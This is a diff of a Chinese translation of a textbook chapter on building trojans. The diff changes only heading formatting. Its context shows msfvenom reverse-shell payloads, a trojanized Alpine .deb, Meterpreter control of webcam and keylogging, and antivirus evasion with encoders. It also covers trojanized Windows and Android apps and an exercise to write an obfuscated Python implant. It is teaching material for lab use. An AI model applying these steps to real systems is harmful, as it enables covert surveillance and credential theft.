@@ -16,7 +16,7 @@
 
 在探索了 Linux 和 Windows 系统的植入物之后，我还将向您展示如何为 Android 设备生成恶意植入物，这些植入物可以监听手机的麦克风，使用手机的相机拍照，查找手机位置，读取并发送短信，并下载手机的通话记录。在本章的练习中，您将构建一个可以通过记录按键来窃取受害者密码，并通过访问其相机拍摄照片的植入物。
 
-### **案例研究：使用 Metasploit 重建 Drovorub**
+### 案例研究：使用 Metasploit 重建 Drovorub
 
 2020 年，NSA 发布了一份分析 Drovorub 的报告。本节讨论了该植入物的架构，如图 10-1 所示，并描述了如何使用开源工具如 Meterpreter 构建类似的东西。
 
@@ -28,7 +28,7 @@ Drovorub 由四个关键部分组成：攻击者的服务器、攻击者的代�
 
 你可以使用开源工具构建类似 Drovorub 植入程序的东西。我们将在这里使用 *Metasploit 框架*，这是一个开源的软件库、黑客工具和漏洞代码的集合。伦理黑客社区经常为 Metasploit 做出贡献，因此它是你伦理黑客工具箱中的一款好工具。
 
-#### ***构建攻击者的服务器***
+#### *构建攻击者的服务器*
 
 让我们首先设置攻击者的服务器，也就是命令和控制服务器，它将接受来自安装在受害者设备上的植入的连接。Metasploit 框架允许你将这样的服务器托管在独立的机器上，但我们将直接在 Kali Linux 虚拟机上托管它。运行以下命令获取机器的 IP 地址：
 
@@ -92,7 +92,7 @@ msf exploit (multi/hander) > exploit
 
 保持这个终端打开，以便服务器继续运行。
 
-#### ***构建受害者客户端***
+#### *构建受害者客户端*
 
 现在，让我们创建要安装到受害者机器上的植入物。在你的 Kali Linux 桌面上创建一个名为*Malware*的新文件夹：
 
@@ -118,7 +118,7 @@ kali@kali:~/Desktop/Malware$ sudo msfvenom -a x86 --platform linux -p linux/
 
 `-a`标志代表目标架构，这里是`x86`。`--platform`标志指定目标平台，`-p`标志指定有效载荷类型，这里是像我们在第四章中实现的反向 TCP shell。`--smallest`标志生成最小可能的有效载荷。`-i`标志有助于我们避免防病毒检测，我稍后会详细讨论。`-f`标志表示我们需要输出的文件类型。我们选择了`elf`，因为它是 Linux 可执行文件使用的格式。（*exe*格式是 Windows 可执行文件使用的格式。）`-o`标志指定输出文件的名称。
 
-#### ***上传植入物***
+#### *上传植入物*
 
 我们将以与在第四章中交付反向 shell 相同的方式交付植入物：通过将其下载到受害者机器上。在 Malware 文件夹中启动一个 Python 服务器，运行以下命令。
 
@@ -163,7 +163,7 @@ meterpreter >
 
 恭喜你！你刚刚安装了第一个开源恶意软件植入物。是的，它真的这么简单。现在，让我们使用攻击者代理与植入物进行交互。
 
-#### ***使用攻击者代理***
+#### *使用攻击者代理*
 
 该代理支持多种命令，允许你与植入物进行交互。例如，你可以使用`ls`命令列出机器上的所有文件。这里，Meterpreter 界面代表黑客代理：
 
@@ -220,7 +220,7 @@ Channel 1 created.
 
 通过运行命令`whoami`尝试与 shell 进行交互。完成后，输入`**exit**`返回 Meterpreter 界面。
 
-#### ***为什么我们需要受害者的内核模块***
+#### *为什么我们需要受害者的内核模块*
 
 如果 Metasploitable 机器上的系统管理员使用以下命令查看运行中的进程，恶意程序将显示如下：
 
@@ -243,11 +243,11 @@ msfadmin 13434  0.0  0.0   2644  1008 pts/1    R+   03:01   0
 
 如你所见，恶意程序显示在 ➊ 处。黑客如何避免被检测？他们通过使用*rootkit*，这是一种为植入物提供操作系统内核功能访问的软件，内核是最高级别的访问权限。植入物可以利用此访问权限使自己几乎无法被检测到。例如，Meterpreter 将尝试通过伪装成另一个进程来躲避检测。在 Windows 上，你可以使用 Meterpreter 的`migrate`命令将恶意进程隐藏在另一个进程中。我们将在第十一章中详细讨论隐藏过程。
 
-### **隐藏植入物于合法文件中**
+### 隐藏植入物于合法文件中
 
 攻击者经常使用社交工程技术将植入物植入受害者的机器。例如，他们可能会向受害者发送钓鱼邮件，鼓励他们从一个假网站下载公司的电子邮件客户端 Alpine 的更新版本，木马程序会小心地将恶意植入物隐藏在另一个程序中。*木马*这一术语源自特洛伊战争，据传，希腊人通过藏在一个巨大的马形雕像“特洛伊木马”中，成功攻入了特洛伊城。我们将在这里执行类似的攻击，通过发送钓鱼邮件，鼓励受害者从假网站下载公司的电子邮件客户端 Alpine 的更新版本。你将在虚拟环境中的 Ubuntu 桌面机器上执行此攻击。现在开始创建木马。
 
-#### ***创建木马***
+#### *创建木马*
 
 在你的*Malicious*文件夹内创建一个名为*trojans*的文件夹并进入该文件夹。这是你将创建的木马存放的地方。
 
@@ -274,7 +274,7 @@ kali@kali:~/Desktop/Malware/trojans/$ engrampa <Alpine DEB file> -e mailTrojan
 
 *图 10-2：* trojans/mailTrojan *文件夹中的文件包含提取的.deb 文件。*
 
-##### **编辑你的.deb 文件**
+##### 编辑你的.deb 文件
 
 你需要编辑 Alpine 安装程序的*.deb*安装文件，使其包含你的恶意植入物。现在让我们了解安装程序的结构。所有安装文件必须包含一个*DEBIAN*文件夹，里面包含描述程序及其安装方法的文件。安装文件还可以包含其他文件夹，如*var*文件夹用于文件，或*usr*文件夹用于二进制文件。这些文件夹将在安装过程中相对于*/home*目录的位置进行复制。例如，安装程序会将*usr*文件夹复制到*/home/usr*。然后安装程序会读取*DEBIAN*文件夹的内容。
 
@@ -359,7 +359,7 @@ kali@kali:~$ touch ~/Desktop/Malware/trojans/mailTrojan/postint
 kali@kali:~$ chmod +x ~/Desktop/Malware/trojans/mailTrojan/postint
 ```
 
-##### **添加植入程序**
+##### 添加植入程序
 
 现在我们将创建植入程序，并将其添加到*/usr/bin*文件夹中，以确保安装程序在安装过程中将其复制到受害者机器上的*/home/usr/bin*文件夹。首先，导航到*mailTrojan*文件夹中的*usr/bin*文件夹：
 
@@ -402,7 +402,7 @@ alpine_2.24+dfsg1-1_amd64.deb mailTrojan mailTrojan.deb
 
 像这样的攻击确实有效，而且通常规模很大。以 Solarwinds 为例，Solarwinds 生产的软件是政府和大型企业用来管理和保护其网络的。2020 年，黑客成功入侵 Solarwinds 的计算机，并修改了其中一个软件库，加入了恶意植入物。当 Solarwinds 安装其软件更新时，恶意植入库也被一同安装。此次攻击影响了多个使用 Solarwinds 软件的公司和政府机构。这个植入物经过精心设计，甚至包含了一种避免被发现的策略。例如，它在激活之前等待了两周，并且如果检测到如 Wireshark 等安全相关软件，它就不会启动。
 
-#### ***托管木马***
+#### *托管木马*
 
 攻击者可以将我们刚刚创建的木马托管在 GitHub 或伪造的网站上。在这一部分，我们将在我们的 Kali Linux 虚拟机上托管木马，并通过本地 Web 服务器提供服务。确保你处于包含木马的文件夹中，并运行以下命令：
 
@@ -422,7 +422,7 @@ kali@kali:~$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/
 
 现在我们有两个服务器在运行：一个提供植入物，另一个接收来自所有已安装植入物的连接。接下来我们必须做的就是通过将植入物下载到我们的 Ubuntu 虚拟机上来测试木马。
 
-#### ***下载感染文件***
+#### *下载感染文件*
 
 启动 Ubuntu 虚拟机，然后通过复制并粘贴以下链接到浏览器中来模拟用户点击电子邮件链接，确保指定你的 Kali Linux 机器的 IP 地址：*http://<Kali IP 地址>/mailTrojan.deb*。
 
@@ -448,7 +448,7 @@ victim@ubuntu:~/Download/$ alpine
 
 如果 Alpine 安装正确，你将看到一个终端界面。现在让我们检查一下我们的植入程序是否也已安装。
 
-#### ***控制植入程序***
+#### *控制植入程序*
 
 重新打开之前启动的攻击者服务器的终端。如果植入程序已正确安装，你应该会看到以下内容，表示植入程序已经连接到服务器：
 
@@ -516,7 +516,7 @@ Stdapi: Webcam Commands
 
 那么接下来你能做什么呢？如何安装一个后门，方便你随时重新进入呢？如果有人重启机器或删除恶意文件，Meterpreter 植入程序将会断开连接。你可以尝试重新攻破机器以保持访问，但如果受害者更改了密码或修补了你最初利用的漏洞，所有的努力都将付诸东流。这就是为什么黑客安装后门；它们允许攻击者通过替代路径重新进入机器。当我在第十一章中讨论 rootkit 时，我会展示如何设计自己的后门。但如果你现在想安装一个，考虑使用 Kyle Barnthouse 设计的*dbd 后门*，可以在 *[`github.com/gitdurandal/dbd/`](https://github.com/gitdurandal/dbd/)* 上找到。
 
-### **通过使用编码器避开杀毒软件**
+### 通过使用编码器避开杀毒软件
 
 杀毒软件不会检测到这些恶意程序吗？并不总是。你可以通过将其上传到 Virus Total 来查看哪些杀毒软件会检测到你的植入程序，网址是 *[`www.virustotal.com/gui/`](https://www.virustotal.com/gui/)*。
 
@@ -598,7 +598,7 @@ Encoders
 
 让我们仔细看看输出中显示的两个编码器，从最简单的开始。
 
-#### ***Base64 编码器***
+#### *Base64 编码器*
 
 `powershell_base64` 编码器使用 base64 编码方案，它将二进制序列转换为文本，类似于 第五章 中提到的 ASCII 编码方案。然而，与将 8 位序列转换为字符的 ASCII 不同，base64 编码器将 6 位序列转换为 64 个可能的可打印字符之一。考虑 表 10-1 中的示例，它将 Linux 的 `ls` 命令从 ASCII 转换为 base64。
 
@@ -647,7 +647,7 @@ kali@kali:~$ nc -lv 80
 kali@kali:~$ nc -lv 443
 ```
 
-#### ***编写一个 Metasploit 模块***
+#### *编写一个 Metasploit 模块*
 
 让我们编写一个 Metasploit 模块，用于对植入物进行 base64 编码。Metasploit 模块是用 Ruby 编程语言编写的。别担心，Ruby 看起来很像 Python，所以你很容易上手。而且，Metasploit 框架是开源的，你可以通过访问 *[`github.com/rapid7/metasploit-framework/blob/master/modules/encoders/cmd/powershell_base64.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/cmd/powershell_base64.rb)* 来查看 *cmd/powershell_base64* 编码器。这个编码器用于对 Windows 机器的 PowerShell 脚本进行编码。
 
@@ -716,7 +716,7 @@ kali@kali:~/Desktop/Malware/$ ./implantEncoded
 
 很好，你已经编写了一个简单的 base64 编码器。然而，它存在一些限制。除了总是产生相同的签名外，它还无法编码已编译的二进制文件。作为一名道德黑客，你经常会将你创建的工具的二进制版本加载到目标机器上。如果你想避免被检测到，编码这些二进制文件本身是一个好主意。Shikata Ga Nai 编码器允许你对二进制文件进行编码。
 
-#### ***Shikata Ga Nai 编码器***
+#### *Shikata Ga Nai 编码器*
 
 *Shikata Ga Nai (SGN) 编码器*通过将有效载荷中的字节与一个随机选择的数字（称为*初始化向量*）进行异或操作来对有效载荷进行编码。这一策略类似于第五章讨论的一次性密码本加密算法。然而，SGN 编码器将初始化向量和解码器代码作为有效载荷的一部分，因此它在有效载荷运行时加载初始化向量，然后启动解码器。解码器循环遍历与编码部分有效载荷相关的内存地址，并通过在每次迭代中将其与初始化向量异或来解码指令。然后，解码器在内存中用解码后的指令替换编码指令。
 
@@ -753,11 +753,11 @@ Saved as: malicious
 
 我们已经使用 `--encoder` 选项指定了 SGN 编码器 ➊。
 
-### **创建一个 Windows 木马**
+### 创建一个 Windows 木马
 
 到目前为止，我们讨论了如何为 Linux 创建一个木马。创建 Windows 木马的过程类似，你也可以使用 `msfvenom` 来实现。我们将介绍两种隐藏植入的方法：通过 Humaeed Ahmed 的 Minesweeper 游戏的一个有趣的开源实现，以及通过使用社会工程工具包（稍后将详细讲解）。
 
-#### ***在扫雷游戏中隐藏木马***
+#### *在扫雷游戏中隐藏木马*
 
 我已经分叉了 Ahmed 的库，你可以通过以下链接下载可执行文件：[`github.com/The-Ethical-Hacking-Book/Minesweeper/blob/master/Minesweeper/bin/Debug/Minesweeper.exe`](https://github.com/The-Ethical-Hacking-Book/Minesweeper/blob/master/Minesweeper/bin/Debug/Minesweeper.exe)*。将其保存到你 Kali 桌面上的*恶意软件*文件夹中。
 
@@ -805,7 +805,7 @@ Options:
 ...
 ```
 
-#### ***将 Trojan 隐藏在 Word 文档（或其他无害文件）中***
+#### *将 Trojan 隐藏在 Word 文档（或其他无害文件）中*
 
 有一个问题：Windows 用户很少安装新程序，他们对通过电子邮件要求安装的程序极度怀疑。然而，用户几乎每天都会打开 Word 文档、PowerPoint 演示文稿和 PDF 文件。你也可以将植入物嵌入这些文件中。*社会工程工具包（SET）* 抽象化了 Metasploit Framework 的细节，并使发送和生成这种感染媒体变得更加容易。运行以下命令启动 SET：
 
@@ -873,7 +873,7 @@ kali@kali:~$ sudo setoolkit
 
 现在我们已经研究了为桌面和服务器创建 Trojan 的技术，接下来让我们为移动和嵌入式设备创建 Trojan。
 
-### **创建 Android Trojan**
+### 创建 Android Trojan
 
 为 Android 设备创建 Trojan 的过程几乎与为 Linux 设备创建 Trojan 的过程相同。目录结构可能有所不同，但正如你在本章中之前所做的，你将修改一个安装包来安装你的植入物。
 
@@ -893,7 +893,7 @@ kali@kali:~/Desktop/AndroidTrojan$ msfvenom -p android/meterpreter/reverse_tcp
 
 该命令生成一个新的 Android APK，并将恶意代码嵌入其中。在接下来的章节中，我们将反汇编这个应用并讨论它的结构，以便你能够创建自己的 Android 木马。
 
-#### ***反构 APK 以查看植入代码***
+#### *反构 APK 以查看植入代码*
 
 上面的命令为你完成了所有工作。为了理解它是如何隐藏植入代码的，让我们反编译*malicious.apk*安装文件并探索它的目录结构。我们将使用`apktool`这个逆向工程工具来反编译 APK。运行以下命令来下载并安装`apktool`：
 
@@ -1020,7 +1020,7 @@ invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content
 
 同样，你可以通过反编译现有的 APK，复制*Metasploit*文件夹到*smali*文件夹，然后将前面的代码片段添加到*MainActivity.smali*中以启动有效载荷，从而创建自己的特洛伊木马。
 
-#### ***重新构建并签署 APK***
+#### *重新构建并签署 APK*
 
 现在我们已经检查了文件，可以通过运行以下命令重新构建它：
 
@@ -1066,7 +1066,7 @@ kali@kali:~/Desktop/AndroidTrojan/$ jarsigner -sigalg SHA2withRSA -digestalg
 
 首先，我们选择签名算法，使用 SHA2 和 RSA（`-sigalg SHA2withRSA`）。然后，我们使用 SHA2 作为哈希/摘要函数（`-digestalg SHA2`）。最后，我们指定 Keystore（`-keystore`）和密钥别名。在这种情况下，我们将使用刚刚创建的 Keystore（`my-malicious.keystore`）和带有别名（`alias_name_malicious`）的条目。
 
-#### ***测试 Android 特洛伊木马***
+#### *测试 Android 特洛伊木马*
 
 现在让我们看看我们的恶意 APK 是如何运作的。我们不希望恶意程序出现在我们的手机上，因此让我们创建一个新的虚拟机来模拟 Android 手机。Google 开发了一个模拟器，它与 Android Studio 捆绑在一起，后者是其 Android 开发环境。按照* [`developer.android.com/studio/install/`](https://developer.android.com/studio/install/)*上的说明，在主机系统中下载 Android Studio，外部于当前的虚拟实验室环境。
 
@@ -1192,11 +1192,11 @@ Android Commands
 
 关于移动设备的最后说明：虽然 iOS 设备通常被认为更安全，但它们也并不完全安全。例如，Facebook 的 WhatsApp 平台中的一个漏洞允许黑客通过发送链接给 WhatsApp 用户，从而在 iPhone 上安装恶意软件。后来，一个国家级黑客组织利用这个漏洞攻击了亚马逊 CEO 杰夫·贝佐斯的 iPhone。
 
-### **练习**
+### 练习
 
 这些练习将增强你对木马的理解。你将首先探索一个自动化创建和签名 Android 木马的工具。在第二个练习中，你将用 Python 编写一个植入物。你的植入物应该从受害者的网络摄像头实时播放视频，并将其传输回攻击者的服务器。
 
-#### ***Evil-Droid***
+#### *Evil-Droid*
 
 *Evil-droid*是一个 Bash 脚本，用于自动化 APK 植入和签名过程。你可以通过运行以下命令从 GitHub 下载它：
 
@@ -1257,7 +1257,7 @@ https://github.com/M4sc3r4n0/Evil-Droid/blob/master/evil-droid
 
 一旦你选择了**[3]**，按照指示和提示创建你的木马，并提供你想要修改的原始 APK。
 
-#### ***编写你自己的 Python 植入物***
+#### *编写你自己的 Python 植入物*
 
 在本章中，我们使用了 Metasploit 提供的植入物。作为练习，编写你自己的植入物，使用受害者的摄像头拍照。
 
@@ -1331,7 +1331,7 @@ with mss() as sct:
 
 你还需要创建并实现一个基本协议，用于控制你的植入物。请参见第四章了解如何操作的示例。最后，*pynput*库非常适合添加键盘记录功能。在使用之前，你需要先安装它。
 
-#### ***混淆你的植入物***
+#### *混淆你的植入物*
 
 现在你已经开发了一个 implant，让我们对其进行加密。记住，加密可以使检测和逆向工程变得更加困难。我们将使用`pyarmor`工具来加密*implant.py*文件。有关`pyarmor`加密过程的详细信息，可以在其文档中找到，网址是*[`pyarmor.readthedocs.io/en/latest/how-to-do.html`](https://pyarmor.readthedocs.io/en/latest/how-to-do.html)*。
 
@@ -1359,7 +1359,7 @@ kali@kali:~$ cd dist
 
 *或者，你可以使用*`*pyminifier*`*来生成代码的压缩版本。*
 
-#### ***构建平台特定的可执行文件***
+#### *构建平台特定的可执行文件*
 
 要运行你刚刚编写的 implant，计算机必须安装 Python。然而，黑客不能假设受害者的计算机上会有 Python。相反，我们需要使用`pyinstaller`工具将 Python 程序转换为可执行文件，你可以按以下方式安装：
 
